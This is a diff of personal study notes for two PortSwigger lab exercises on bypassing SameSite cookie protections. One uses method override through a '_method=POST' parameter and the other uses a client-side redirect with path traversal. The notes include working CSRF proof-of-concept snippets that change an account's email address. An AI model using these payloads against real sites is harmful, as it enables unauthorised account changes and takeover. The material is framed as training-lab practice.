@@ -1,1 +1,22 @@
+---------------------Samesite Lax via method override -----------------------------------------
+Step1)Navigate to the post request and then change it to get one 
+      ---It must look like this when the request method is overidden !!!
+      ---GET /my-account/change-email?email=scarofcupid@gmail.com&_method=POST HTTP/1.1
+      ---&_method=POST == must for this method !!
+ Step2)insert the following payload in CSRF Poc 
+      --- <input type="hidden" name="_method" value="POST">
+      ---IF the email/any-parameter doesn't change then use this thing inside script 
+      ---<script>
+           document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
+        </script>
+        
+
+---------------------SameSite Strict bypass via client-side redirect ---------------------------
+Step1)Search for redirection
+      ---In this case /post/comment/confirmationid?6
+      ---Modify the request such that it goes to the account page (eg: /my-account/changeemail?email=scarofcupid1@gmail.com where it receives csrf code)
+Step2)Make a script like this where it receives redirection 
+       <script>
+           document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
+       </script>
 
